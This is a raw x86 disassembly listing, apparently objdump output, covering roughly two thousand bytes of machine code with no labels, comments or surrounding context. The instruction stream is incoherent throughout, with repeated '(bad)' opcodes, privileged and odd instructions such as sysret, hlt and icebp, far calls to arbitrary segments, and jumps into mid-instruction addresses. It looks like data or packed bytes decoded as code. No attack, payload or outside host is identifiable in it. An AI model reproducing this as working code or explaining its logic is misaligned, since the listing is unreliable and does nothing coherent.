  4325af:	xor    eax,DWORD PTR [eax-0x3c73839a]
  4325b5:	xor    al,0x45
  4325b7:	fs pop ebx
  4325b9:	mov    ebx,0x9c3b36
  4325be:	je     0x4325eb
  4325c0:	xor    edi,DWORD PTR [ebx+0x668a33]
  4325c6:	mov    WORD PTR [ebx],?
  4325c8:	xor    al,0xbb
  4325ca:	fs dec edi
  4325cc:	mov    eax,DWORD PTR [eax]
  4325ce:	pop    edi
  4325cf:	cmp    ecx,ecx
  4325d1:	jne    0x432628
  4325d3:	mov    ebp,esp
  4325d5:	cld    
  4325d6:	push   esi
  4325d7:	pop    ebx
  4325d8:	inc    ebp
  4325d9:	stc    
  4325da:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  4325e2:	clc    
  4325e3:	test   dl,dl
  4325e5:	jmp    DWORD PTR ss:[esi+eiz*2+0x5e]
  4325ea:	or     bl,al
  4325ec:	add    BYTE PTR [ebx+0x57665100],cl
  4325f2:	retf   0x3a45
  4325f5:	add    BYTE PTR ss:[esi+eiz*2+0x3a85cabe],bl
  4325fd:	clc    
  4325fe:	add    BYTE PTR [ebx+0x66],bl
  432601:	dec    edx
  432603:	mov    edx,DWORD PTR [edi-0x76]
  432606:	push   edi
  432607:	add    al,0xb7
  432609:	xor    al,0xba
  43260b:	cmp    al,0x8d
  43260d:	je     0x43260e
  43260f:	mov    edx,DWORD PTR [ebx-0x46]
  432612:	push   ecx
  432613:	lea    edi,[ebx+0x534fff]
  432619:	push   ecx
  43261a:	cmp    edx,DWORD PTR [ebx+0x75]
  43261d:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  432623:	add    BYTE PTR [ebx],dh
  432625:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  43262b:	add    BYTE PTR [ebx+esi*1+0x4f64bb34],cl
  432632:	mov    ebx,0x3b3b00
  432637:	jne    0x432664
  432639:	mov    DWORD PTR [ebx+0x728afc],edi
  43263f:	xor    esi,DWORD PTR [ebx]
  432641:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  432647:	push   edi
  432648:	cmp    esp,ebp
  43264a:	jne    0x43264c
  43264c:	sbb    DWORD PTR [eax],0x8085c3fc
  432652:	clc    
  432653:	inc    ebp
  432654:	pop    ebx
  432655:	sti    
  432656:	add    eax,0xeb8bc075
  43265b:	cld    
  43265c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432662:	mov    ecx,DWORD PTR [ecx+edx*2]
  432665:	rol    DWORD PTR [ebp-0x37],0xf
  432669:	mov    DWORD PTR [eax],ecx
  43266b:	inc    edi
  43266c:	(bad)  
  43266d:	in     eax,0x0
  43266f:	add    bh,bh
  432671:	(bad)  
  432672:	mov    esi,0xc38a5e
  432677:	mov    esi,DWORD PTR [ebx]
  432679:	push   ecx
  43267a:	mov    edi,0xfc4fc7
  43267f:	test   DWORD PTR [ebp-0x8],edx
  432682:	xor    ax,0x9cc7
  432686:	sub    ebp,eax
  432688:	inc    ebp
  432689:	(bad)  
  43268a:	sub    edi,edi
  43268c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432692:	inc    ebp
  432693:	add    BYTE PTR [esi+0x2b],ah
  432696:	or     bh,BYTE PTR [edx+0xf8ac2]
  43269c:	cmp    al,0x33
  43269e:	mov    edi,DWORD PTR [edx+0x4f81]
  4326a4:	(bad)  
  4326a5:	cmp    esi,DWORD PTR [ebx]
  4326a7:	je     0x432661
  4326a9:	push   ebx
  4326aa:	dec    edi
  4326ab:	str    ecx
  4326ae:	cmp    esp,DWORD PTR [esi+0x75]
  4326b1:	int    0x33
  4326b3:	mov    edi,0x789085f
  4326b8:	mov    edx,DWORD PTR [esp+edi*8]
  4326bb:	add    cl,cl
  4326bd:	data16 add al,0xcb
  4326c0:	push   ebp
  4326c1:	add    ebp,esp
  4326c3:	jne    0x4326b1
  4326c5:	(bad)  
  4326c6:	mov    DWORD PTR [ecx],0xd685f7ec
  4326cc:	clc    
  4326cd:	xlat   BYTE PTR ds:[ebx]
  4326ce:	inc    ebp
  4326cf:	mov    esi,DWORD PTR [eax+edx*2]
  4326d2:	pushf  
  4326d3:	in     eax,0x8b
  4326d5:	add    ah,ch
  4326d7:	add    BYTE PTR [ebx+0x0],dl
  4326da:	push   ecx
  4326db:	add    ax,0x72cb
  4326df:	cmp    al,BYTE PTR [eax]
  4326e1:	add    BYTE PTR [ebp+0x66],al
  4326e4:	(bad)  
  4326e5:	retf   
  4326e6:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  4326ed:	retf   
  4326ee:	cmp    eax,ecx
  4326f0:	pushf  
  4326f1:	jge    0x4326ba
  4326f3:	ss cld 
  4326f5:	pushf  
  4326f6:	test   DWORD PTR [edi-0x8],ebx
  4326f9:	je     0x432740
  4326fb:	xor    esi,DWORD PTR ds:0x7020840
  432701:	ror    BYTE PTR [ebp-0x37],0x8d
  432705:	push   ebp
  432706:	add    esp,ebp
  432708:	jb     0x432695
  43270a:	add    BYTE PTR [eax],cl
  43270c:	dec    ebp
  43270d:	mov    bh,0x81
  43270f:	push   esi
  432710:	push   ebx
  432711:	adc    DWORD PTR [ecx-0x3b],0x3a9aff81
  432718:	xor    al,BYTE PTR [eax]
  43271a:	mov    edx,DWORD PTR [edi+0x10]
  43271d:	(bad)  
  43271e:	scas   eax,DWORD PTR es:[edi]
  43271f:	cmp    bh,BYTE PTR [ebx]
  432721:	add    BYTE PTR [edi],cl
  432723:	mov    ebp,ebp
  432725:	cld    
  432726:	add    BYTE PTR [ebx],bh
  432728:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  43272c:	dec    ebp
  43272d:	or     BYTE PTR [ebx],ch
  43272f:	ret    0x458b
  432732:	lock jmp 0x432726
  432735:	mov    ecx,DWORD PTR [eax]
  432737:	or     BYTE PTR [edi],al
  432739:	mov    ecx,eax
  43273b:	xor    DWORD PTR [edx+0x2],0x0
  43273f:	mov    bh,0xc1
  432741:	adc    BYTE PTR [eax],dh
  432743:	iret   
  432744:	inc    ebp
  432745:	mov    DWORD PTR [ebx],0x4dfff8c5
  43274b:	inc    BYTE PTR [ebx]
  43274d:	cmp    bh,al
  43274f:	add    BYTE PTR [ecx],dl
  432751:	data16 adc al,bh
  432754:	dec    ecx
  432755:	fisttp WORD PTR [ecx+0x456604c0]
  43275b:	add    dh,BYTE PTR ds:0x75e0845
  432761:	ret    0x4d
  432764:	lea    ecx,[ebx+0x18728301]
  43276a:	add    BYTE PTR [ebp+0x45],al
  43276d:	xor    eax,0xc7009ce9
  432772:	add    al,ch
  432774:	inc    ebp
  432775:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43277b:	xor    eax,0x781084d
  432780:	push   ebx
  432781:	call   0xf89a:0x89813251
  432788:	xor    al,BYTE PTR [ebp+0x3b]
  43278b:	cmp    eax,0xc78b9c76
  432790:	or     ah,dh
  432792:	inc    ebp
  432793:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432799:	cmp    ecx,DWORD PTR [ebx-0x74747664]
  43279f:	in     al,dx
  4327a0:	hlt    
  4327a1:	push   ebx
  4327a2:	push   ebx
  4327a3:	push   ecx
  4327a4:	push   ecx
  4327a5:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4327ab:	call   0xe889:0x8b32329a
  4327b2:	clc    
  4327b3:	icebp  
  4327b4:	pop    ebx
  4327b5:	or     BYTE PTR [ebp+0x7],al
  4327b8:	mov    eax,ecx
  4327ba:	clc    
  4327bb:	jb     0x43277e
  4327bd:	add    BYTE PTR [ebp+0x55],cl
  4327c0:	or     DWORD PTR [edi],0xc251d153
  4327c6:	add    DWORD PTR [ebx+0x32009a],0x8b76453b
  4327d0:	mov    edi,eax
  4327d2:	or     cl,al
  4327d4:	inc    ebp
  4327d5:	dec    ebp
  4327d6:	mov    eax,DWORD PTR [ecx+0x514d530c]
  4327dc:	or     WORD PTR [ecx],0x899a
  4327e1:	xor    cl,BYTE PTR [ebx+0x5376fc3b]
  4327e7:	mov    edx,DWORD PTR [ecx+0x8]
  4327ea:	mov    eax,DWORD PTR [ebp-0x8]
  4327ed:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb266]
  4327f4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4327fa:	inc    ebp
  4327fb:	dec    eax
  4327fc:	add    ecx,DWORD PTR [ebx+0x534df0f8]
  432802:	add    edx,DWORD PTR [ecx-0x8]
  432805:	mov    ecx,DWORD PTR [ecx]
  432807:	clc    
  432808:	or     BYTE PTR [ebp+eax*2+0x4532409a],al
  43280f:	mov    ecx,ebp
  432811:	clc    
  432812:	(bad)  
  432813:	popf   
  432814:	inc    DWORD PTR [eax]
  432816:	ret    0x8b
  432819:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43281f:	mov    edi,esp
  432821:	hlt    
  432822:	test   ecx,esi
  432824:	clc    
  432825:	or     BYTE PTR [ebp+0x7],al
  432828:	xor    al,0xc1
  43282a:	pushf  
  43282b:	jb     0x432860
  43282d:	add    BYTE PTR [eax-0x3f],al
  432830:	inc    eax
  432831:	daa    
  432832:	inc    ebp
  432833:	inc    ebp
  432834:	xor    eax,0x7f80803
  432839:	dec    ebp
  43283a:	call   0xc09:0x39f83203
  432841:	or     BYTE PTR [edx],al
  432843:	inc    ebp
  432844:	sub    al,0x35
  432846:	inc    ebp
  432847:	or     BYTE PTR ds:0x74d0807,dh
  43284d:	lea    ebx,[edx-0x748dcdff]
  432853:	add    BYTE PTR [eax*2-0x74b21438],cl
  43285a:	mov    edx,DWORD PTR [eax]
  43285c:	cld    
  43285d:	dec    ebp
  43285e:	push   ebx
  43285f:	sub    edx,DWORD PTR [ecx-0x75]
  432862:	add    eax,0xf172fc
  432867:	or     BYTE PTR [ebp+0x7],cl
  43286a:	add    eax,ecx
  43286c:	or     al,0x72
  43286e:	add    DWORD PTR [eax],eax
  432870:	mov    ebx,0x29c2c1
  432875:	inc    ebp
  432876:	mov    eax,DWORD PTR [ebx]
  432878:	cmp    eax,0x3004d1c
  43287e:	xbegin 0x66c8b478
  432884:	clc    
  432885:	or     BYTE PTR [ebp+0x45],al
  432888:	xor    al,0x35
  43288a:	pushf  
  43288b:	or     BYTE PTR [ebx+0x454d1007],cl
  432891:	lea    eax,[ebp+0x33727501]
  432897:	add    cl,ch
  432899:	inc    ebp
  43289a:	add    bl,ch
  43289c:	add    BYTE PTR [ebx+0x45850845],cl
  4328a2:	je     0x43282f
  4328a4:	push   ebx
  4328a5:	or     al,0x85
  4328a7:	dec    ebp
  4328a8:	std    
  4328a9:	mov    bh,bh
  4328ab:	mov    BYTE PTR [ebp-0x75],al
  4328ae:	mov    edi,eax
  4328b0:	or     al,0x89
  4328b2:	inc    ebp
  4328b3:	clc    
  4328b4:	mov    esp,esp
  4328b6:	hlt    
  4328b7:	call   DWORD PTR [edi-0x37]
  4328ba:	push   ebx
  4328bb:	or     al,0x51
  4328bd:	push   ebp
  4328be:	xor    ebp,esp
  4328c0:	mov    esi,0x457251
  4328c5:	xor    eax,0xc7459cc6
  4328ca:	mov    edi,eax
  4328cc:	or     al,0x85
  4328ce:	add    al,bh
  4328d0:	inc    eax
  4328d2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4328d6:	or     ah,bh
  4328d8:	inc    eax
  4328d9:	push   ebx
  4328da:	jmp    0x43292d
  4328dc:	mov    eax,DWORD PTR ds:0xe8720c
  4328e2:	mov    DWORD PTR [ebp-0x8],eax
  4328e5:	jne    0x43292c
  4328e7:	jmp    0x432874
  4328e9:	mov    ebp,DWORD PTR [eax]
  4328eb:	clc    
  4328ec:	retf   0xff53
  4328ef:	push   ecx
  4328f0:	mov    DWORD PTR ds:0x757210,eax
  4328f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4328f9:	sub    esp,DWORD PTR [ebx-0x77]
  4328fc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432903:	or     ah,bh
  432905:	pop    es
  432906:	ds call 0x8f0:0x8b8b32ff
  43290e:	(bad)  
  43290f:	dec    ebp
  432910:	(bad)  
  432911:	mov    bh,bh
  432913:	jmp    0x432901
  432915:	leave  
  432916:	jne    0x432920
  432918:	call   0x302272
  43291d:	in     al,dx
  43291e:	dec    ebp
  43291f:	add    dh,BYTE PTR [ebx]
  432921:	add    BYTE PTR [ebx],al
  432923:	inc    ebp
  432924:	cmp    esi,DWORD PTR ds:0xc78b9c74
  43292a:	or     al,0xf0
  43292c:	add    BYTE PTR [ebp+0x458bf845],al
  432932:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432938:	adc    al,0x7
  43293a:	enter  0x9fc0,0xa5
  43293e:	rol    BYTE PTR [eax],0x5e
  432941:	mov    ecx,ecx
  432943:	or     al,0xc
  432945:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  43294c:	jmp    0x43294d
  43294e:	push   ebp
  43294f:	mov    esp,ebp
  432951:	cld    
  432952:	inc    ebp
  432953:	inc    ebp
  432954:	or     DWORD PTR [ecx+0x457dec10],0x0
  43295b:	push   esi
  43295c:	push   esi
  43295d:	mov    edi,0x7af080f
  432962:	add    bh,al
  432964:	test   DWORD PTR [edx+0x3a7320f],ebx
  43296a:	add    BYTE PTR [ecx+0x4540100f],cl
  432970:	mov    ebp,eax
  432972:	mov    ebp,edi
  432974:	lock call edx
  432977:	fcom   DWORD PTR [ebp+0x45]
  43297a:	mov    eax,0x148a8b
  43297f:	push   ecx
  432980:	enter  0xc145,0x83
  432984:	cmp    ecx,DWORD PTR [eax]
  432986:	add    BYTE PTR [ebp+0x4d],al
  432989:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  43298f:	call   0xffa324fe
  432994:	cmp    eax,DWORD PTR [ebp-0xc]
  432997:	jmp    DWORD PTR [eax+edx*1-0x4e]
  43299b:	push   ebp
  43299c:	(bad)
  43299f:	std    
  4329a0:	lock push DWORD PTR [edi+0x5d08fcdb]
  4329a7:	inc    ebp
  4329a8:	(bad)  
  4329a9:	call   0xff7d2639
  4329ae:	add    al,BYTE PTR [ebp+0x37]
  4329b1:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  4329b7:	jne    0x4329b9
  4329b9:	(bad)  
  4329ba:	cmp    edi,esp
  4329bc:	jne    0x4329ef
  4329be:	mov    edi,edi
  4329c0:	or     BYTE PTR [ebx-0x307f0b49],cl
  4329c6:	pop    ds
  4329c7:	into   
  4329c8:	je     0x43298b
  4329ca:	mov    ebx,DWORD PTR [esi]
  4329cc:	or     BYTE PTR [ebp-0x49],al
  4329cf:	mov    esp,DWORD PTR [esi-0x77]
  4329d2:	mov    esi,0x451f0c
  4329d7:	mov    eax,DWORD PTR [eax]
  4329d9:	or     al,0x66
  4329db:	sar    bl,0x3b
  4329de:	xor    esi,DWORD PTR [ebp+0x66]
  4329e1:	xor    ecx,edi
  4329e3:	pop    edi
  4329e4:	adc    bl,BYTE PTR [ebx+0x7c]
  4329e7:	ret    0xff
  4329ea:	cld    
  4329eb:	inc    ebp
  4329ec:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4329f2:	cld    
  4329f3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4329fa:	push   0xffffff83
  4329fc:	pop    edi
  4329fd:	or     BYTE PTR [ebp+0x53],dh
  432a00:	xorps  xmm1,xmm2
  432a03:	test   BYTE PTR [eax+eax*1],bh
  432a06:	add    BYTE PTR [eax],al
  432a08:	adc    eax,eax
  432a0a:	add    DWORD PTR [esp+edi*2-0xff7b00],0xffffffb7
  432a12:	jmp    DWORD PTR [eax]
  432a14:	ror    al,0x5e
  432a17:	inc    ebp
  432a18:	leave  
  432a19:	xor    ecx,DWORD PTR [eax]
  432a1b:	and    DWORD PTR [ebx-0x3ec50708],ecx
  432a21:	add    ch,al
  432a23:	xor    edi,edi
  432a25:	xor    DWORD PTR [ebx],0x66003300
  432a2b:	mov    DWORD PTR [ebp-0xc],ecx
  432a2e:	pcmpgtw mm0,mm0
  432a31:	add    dl,ah
  432a33:	leave  
  432a34:	mov    edi,DWORD PTR [esi-0x7d]
  432a37:	push   ax
  432a39:	dec    ebp
  432a3a:	mov    esi,DWORD PTR [ebx-0x75]
  432a3d:	lea    ebp,[eax-0x7c010000]
  432a43:	xor    eax,DWORD PTR [eax]
  432a45:	sysret 
  432a47:	dec    ebp
  432a48:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432a4f:	push   WORD PTR [ecx+0x8]
  432a53:	jne    0x432a16
  432a55:	ud0    ecx,DWORD PTR [ecx]
  432a58:	mov    edi,DWORD PTR [edx]
  432a5a:	lods   al,BYTE PTR ds:[esi]
  432a5b:	add    BYTE PTR [eax],al
  432a5d:	data16 (bad) 
  432a5f:	iret   
  432a60:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432a67:	cli    
  432a68:	inc    ebp
  432a69:	cmp    al,0x8d
  432a6b:	add    BYTE PTR [esi+0x2d],ah
  432a6e:	inc    ebp
  432a6f:	pop    ebp
  432a70:	lea    ecx,[edi]
  432a72:	mov    dl,bh
  432a74:	add    BYTE PTR [edi],cl
  432a76:	mov    DWORD PTR [eax+eax*8],edi
  432a79:	mov    ebx,0x3b87
  432a7e:	add    BYTE PTR [ebx],ch
  432a80:	inc    ebp
  432a81:	data16 (bad) 
  432a83:	clc    
  432a84:	int3   
  432a85:	cmp    eax,DWORD PTR [eax]
  432a87:	je     0x432a12
  432a89:	push   0xffffffc8
  432a8b:	pop    edi
  432a8c:	xchg   DWORD PTR [ebp+0x0],eax
  432a8f:	data16 add BYTE PTR [ebp+0x45],cl
  432a93:	lea    cx,[ebp+0x10]
  432a97:	jb     0x432a99
  432a99:	jmp    0x432a24
  432a9b:	call   eax
  432a9d:	clc    
  432a9e:	xchg   DWORD PTR [edi+0x1],edi
  432aa1:	mov    eax,DWORD PTR [eax]
  432aa3:	or     BYTE PTR [ebp-0x49],al
  432aa6:	lea    eax,[eax+0x74003154]
  432aac:	push   edi
  432aad:	inc    edx
  432aae:	jge    0x432aaf
  432ab0:	mov    DWORD PTR [edi],ecx
  432ab2:	fdiv   DWORD PTR [edi-0x6]
  432ab5:	inc    DWORD PTR [eax]
  432ab7:	xor    edx,DWORD PTR [eax+0x5f]
  432aba:	xchg   DWORD PTR [ebx+0x1],ebx
  432abd:	ret    0x0
  432ac0:	xor    BYTE PTR [ebp-0x51],cl
  432ac3:	cmp    edi,0xf0ff8900
  432ac9:	data16 ror al,0x84
  432acd:	rol    BYTE PTR [eax],0x3b
  432ad0:	add    al,dh
  432ad2:	dec    eax
  432ad3:	xchg   esp,eax
  432ad4:	push   ebx
  432ad5:	jmp    0x432a62
  432ad7:	push   ebp
  432ad8:	add    esp,ebp
  432ada:	add    ebp,esp
  432adc:	mov    edx,DWORD PTR [edi+0x24]
  432adf:	clc    
  432ae0:	dec    esi
  432ae1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ae7:	cmp    BYTE PTR [ebx],al
  432ae9:	jne    0x432a74
  432aeb:	xor    esp,eax
  432aed:	jmp    0x462c70
  432af2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432af5:	jne    0x432aeb
  432af7:	call   0xffcd2851
  432afc:	clc    
  432afd:	xchg   edi,eax
  432afe:	sti    
  432aff:	add    DWORD PTR [ebx],eax
  432b01:	add    BYTE PTR [ebp+0x47],bl
  432b04:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432b0a:	pop    ebp
  432b0b:	mov    DWORD PTR [esi-0x48],esi
  432b0e:	jmp    0x432b57
  432b10:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432b16:	(bad)  
  432b18:	cmp    al,0x0
  432b1a:	cmp    eax,DWORD PTR [ebp+0x18]
  432b1d:	lea    ebx,[ebp-0x56]
  432b20:	jle    0x432b22
  432b22:	jae    0x432aad
  432b24:	mov    eax,esp
  432b26:	call   0xb900:0x8b005587
  432b2d:	inc    ebp
  432b2e:	push   ebp
  432b2f:	lea    ecx,[ebp-0x27ff4f12]
  432b35:	mov    eax,edi
  432b37:	int3   
  432b38:	push   ebp
  432b39:	xchg   edi,eax
  432b3b:	add    esp,ebp
  432b3d:	add    BYTE PTR [eax],al
  432b3f:	inc    ebp
  432b40:	add    BYTE PTR [ebp+0x8b3255],cl
  432b46:	cld    
  432b47:	mov    DWORD PTR [edx],edi
  432b49:	aam    0x75
  432b4b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432b51:	mov    DWORD PTR [ebx-0x50],edx
  432b54:	test   BYTE PTR [ebp-0x1],0xe8
  432b58:	mov    eax,DWORD PTR [eax]
  432b5a:	hlt    
  432b5b:	add    al,al
  432b5d:	mov    eax,DWORD PTR ds:0x890045a8
  432b63:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432b69:	inc    DWORD PTR [eax*2+0xf75854d]
  432b70:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432b76:	call   0x729988b7
  432b7b:	je     0x432bdb
  432b7d:	js     0x432bde
  432b7f:	lock ret 0x7e
  432b83:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432b89:	mov    edi,edi
  432b8b:	sbb    al,bl
  432b8d:	clc    
  432b8e:	add    BYTE PTR [ebp-0x73],bh
  432b91:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432b97:	ror    BYTE PTR [eax],1
  432b99:	dec    ebp
  432b9a:	xchg   ebp,eax
  432b9b:	mov    edi,edi
  432b9d:	in     al,0x8b
  432b9f:	jge    0x432b2a
  432ba1:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432ba7:	clc    
  432ba8:	pop    esi
  432ba9:	fist   DWORD PTR [ebp+0x5d398b5d]
  432baf:	clc    
  432bb0:	add    al,0x6e
  432bb2:	mov    eax,DWORD PTR [ebx]
  432bb4:	mov    BYTE PTR [ebp+0x0],dl
  432bb7:	mov    edx,DWORD PTR [ebx-0x20]
  432bba:	adc    esi,DWORD PTR [edi+0x5e005f3a]
  432bc0:	add    eax,0x3b3b73
  432bc5:	adc    al,0x89
  432bc7:	pop    eax
  432bc8:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432bcc:	ret    0xf08
  432bcf:	cmp    al,0x2
  432bd1:	mov    DWORD PTR [edx],edi
  432bd3:	cld    
  432bd4:	add    BYTE PTR [ebp+0x66],dl
  432bd7:	add    eax,ebx
  432bd9:	add    esp,eax
  432bdb:	sub    eax,eax
  432bdd:	or     BYTE PTR [ecx-0x77f474bb],cl
  432be3:	add    BYTE PTR [eax],al
  432be5:	mov    DWORD PTR [ebx-0x24],ebx
  432be8:	push   edi
  432be9:	push   ebp
  432bea:	clc    
  432beb:	add    DWORD PTR [esi+0x1b0100],0x45
  432bf2:	out    0xff,eax
  432bf4:	add    edx,DWORD PTR [eax]
  432bf6:	jmp    0x432be0
  432bf8:	cmp    ch,0x45
  432bfb:	(bad)  
  432bfc:	jmp    0x40c8b44e
  432c01:	je     0x432b8d
  432c03:	mov    eax,DWORD PTR [eax-0x10c78304]
  432c09:	inc    ebp
  432c0a:	add    BYTE PTR [ebx-0x770375],al
  432c10:	add    ah,ch
  432c12:	add    edx,esp
  432c14:	pop    edi
  432c15:	pop    ebp
  432c16:	push   ebp
  432c17:	inc    ebx
  432c18:	in     al,dx
  432c19:	pop    ebp
  432c1a:	in     al,dx
  432c1b:	cmp    edx,DWORD PTR [edi-0x8]
  432c1e:	xor    eax,0x895b9c94
  432c23:	leave  
  432c24:	call   0x8998732d
  432c29:	in     al,dx
  432c2a:	in     al,0x45
  432c2c:	dec    ebp
  432c2d:	push   esi
  432c2e:	test   DWORD PTR [eax+0xfb010f],esi
  432c34:	add    BYTE PTR [eax+0xc018b],dh
  432c3a:	leave  
  432c3b:	inc    ebp
  432c3c:	test   al,ch
  432c3e:	add    dh,bh
  432c40:	add    bh,bh
  432c42:	dec    ebp
  432c43:	push   cs
  432c44:	mov    DWORD PTR [ecx],eax
  432c46:	hlt    
  432c47:	push   es
  432c48:	dec    ebp
  432c49:	leave  
  432c4a:	mov    DWORD PTR [eax],ecx
  432c4c:	clc    
  432c4d:	cmovge eax,ecx
  432c50:	mov    ecx,0x85c2f0
  432c56:	clc    
  432c57:	pop    DWORD PTR [ebp+0x1]
  432c5a:	push   ebx
  432c5b:	add    BYTE PTR [ebp-0x15],bh
  432c5e:	push   esi
  432c5f:	xor    eax,0x898a45
  432c64:	cld    
  432c65:	add    BYTE PTR [ebp+0x0],al
  432c68:	cmp    esp,DWORD PTR [esi-0x64]
  432c6b:	add    DWORD PTR [esi+0x78308c1],edi
  432c71:	add    ah,BYTE PTR [esi-0x49]
  432c74:	int    0xbb
  432c76:	mov    ecx,DWORD PTR [edi+0xc]
  432c79:	add    dh,al
  432c7b:	cmp    ecx,ebx
  432c7d:	jne    0x432c47
  432c7f:	xor    ecx,DWORD PTR [ebp+0x66]
  432c82:	jmp    0xca2c88
  432c87:	add    DWORD PTR [ebp+0x0],eax
  432c8a:	mov    eax,ebx
  432c8c:	or     al,0x8b
  432c8e:	(bad)  
  432c8f:	mov    ecx,esi
  432c91:	mov    BYTE PTR [eax+eax*1+0x664c134],cl
  432c98:	mov    eax,edi
  432c9a:	or     BYTE PTR [edx],cl
  432c9c:	shl    cl,cl
  432c9e:	icebp  
  432c9f:	add    BYTE PTR [ebp+0x39],0x8b
  432ca3:	or     BYTE PTR [edx+eax*2],cl
  432ca6:	(bad)  
  432ca7:	or     cl,dh
  432ca9:	stc    
  432caa:	shl    DWORD PTR [ebp-0x30],0xc6
  432cae:	xor    al,0x0
  432cb0:	inc    ebp
  432cb1:	xchg   BYTE PTR [ebx],al
  432cb3:	add    esp,edi
  432cb5:	add    BYTE PTR [ebp-0x39],cl
  432cb8:	mov    al,bl
  432cba:	test   DWORD PTR [ebx+0x1c348375],ecx
  432cc0:	sub    al,0xbf
  432cc2:	jmp    0x432c49
  432cc4:	mov    edi,eax
  432cc6:	lock jge 0x432cba
  432cc9:	lea    esi,[edx-0x74bad501]
  432ccf:	mov    ebp,esp
  432cd1:	or     cl,dh
  432cd3:	leave  
  432cd4:	add    al,BYTE PTR [eax+eax*4-0x37ff9a00]
  432cdb:	dec    ebp
  432cdc:	dec    ebp
  432cdd:	test   DWORD PTR [ebx],eax
  432cdf:	paddb  mm6,mm0
  432ce2:	add    DWORD PTR [eax],eax
  432ce4:	dec    ebp
  432ce5:	mov    ecx,DWORD PTR [ebx-0x65b217f0]
  432ceb:	mov    esi,DWORD PTR [edx]
  432ced:	or     al,0x2b
  432cef:	dec    ebp
  432cf0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432cf6:	mov    esp,eax
  432cf8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432cff:	mov    DWORD PTR [ebx],ebp
  432d01:	call   0xc76b631
  432d06:	mov    DWORD PTR [ebp+0x10],ecx
  432d09:	(bad)  
  432d0a:	push   0x8b85ff10
  432d0f:	clc    
  432d10:	or     al,0x53
  432d12:	(bad)  
  432d13:	push   ecx
  432d14:	retf   
  432d15:	mov    ebx,0xff4d8dc8
  432d1a:	mov    DWORD PTR [ebp+0x8],eax
  432d1d:	xor    eax,DWORD PTR [ebp-0x75]
  432d20:	cmp    ebp,DWORD PTR [ebx]
  432d22:	lsl    ebx,WORD PTR [edi-0x8]
  432d26:	call   DWORD PTR [ebx-0x741bff75]
  432d2c:	(bad)  
  432d2d:	or     al,0x5b
  432d2f:	dec    ebp
  432d30:	or     BYTE PTR [ebx],dh
  432d32:	inc    ebp
  432d33:	xor    esi,DWORD PTR ds:0x708088d
  432d39:	in     eax,0x9a
  432d3b:	add    BYTE PTR [edx],dh
  432d3d:	inc    ebp
  432d3e:	pop    edi
  432d3f:	xor    eax,edx
  432d41:	test   DWORD PTR [eax],0x81108b8b
  432d47:	dec    ebp
  432d48:	sub    al,0x33
  432d4a:	add    BYTE PTR [ebx],dh
  432d4c:	push   esi
  432d4d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432d53:	mov    edi,eax
  432d55:	or     BYTE PTR [ebp+0x45],al
  432d58:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432d5e:	xor    eax,0xc7069cc9
  432d63:	inc    ebp
  432d64:	cld    
  432d65:	cmp    DWORD PTR [ebp+0x454df817],eax
  432d6b:	cmp    BYTE PTR ds:0xc7669c53,0xd1
  432d72:	in     al,0x4d
  432d74:	xchg   BYTE PTR [eax-0x3dbaac08],al
  432d7a:	aad    0xe9
  432d7c:	xlat   BYTE PTR ds:[ebx]
  432d7d:	rol    bh,cl
  432d7f:	mov    edx,esp
  432d81:	or     BYTE PTR [ebp+0x4588f84d],al
  432d87:	mov    ecx,DWORD PTR [eax]
  432d89:	or     BYTE PTR [eax],al
  432d8b:	push   ebp
  432d8c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432d92:	dec    ebp
  432d93:	enter  0xceba,0x8
  432d97:	retf   0x1807
  432d9a:	ret    0x9a4d
  432d9d:	mov    esi,DWORD PTR [edx]
  432d9f:	or     al,0x33
  432da1:	into   
  432da2:	add    edx,esi
  432da4:	add    ecx,edx
  432da6:	bswap  eax
  432da8:	ror    esi,0x98
  432dab:	dec    ebp
  432dac:	add    cl,ch
  432dae:	mov    edi,edi
  432db0:	hlt    
  432db1:	inc    esi
  432db3:	inc    ebp
  432db4:	ret    0x4533
  432db7:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432dbd:	or     BYTE PTR [ebx],dh
  432dbf:	dec    ebp
  432dc0:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432dc6:	jne    0xff8d2d8d
  432dcc:	inc    ebp
  432dcd:	inc    ebp
  432dce:	mov    esi,DWORD PTR [ebx]
  432dd0:	clc    
  432dd1:	pop    esi
  432dd2:	ret    0xcaeb
